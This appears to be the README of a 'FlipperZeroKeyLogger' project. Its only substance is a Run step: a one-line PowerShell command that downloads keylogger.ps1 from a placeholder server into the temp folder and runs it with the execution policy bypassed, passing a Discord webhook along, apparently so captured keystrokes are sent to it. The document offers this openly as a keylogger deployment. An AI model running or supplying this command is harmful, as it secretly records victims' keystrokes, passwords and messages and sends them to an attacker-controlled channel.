# FlipperZeroKeyLogger
FlipperZeroKeyLogger

## Run
$discord = '<your_webhook_here>' Invoke-WebRequest -Uri 'http://your-server.com/keylogger.ps1' -OutFile "$env:TEMP\keylogger.ps1" powershell.exe -ExecutionPolicy Bypass -File "$env:TEMP\keylogger.ps1" -discord $discord
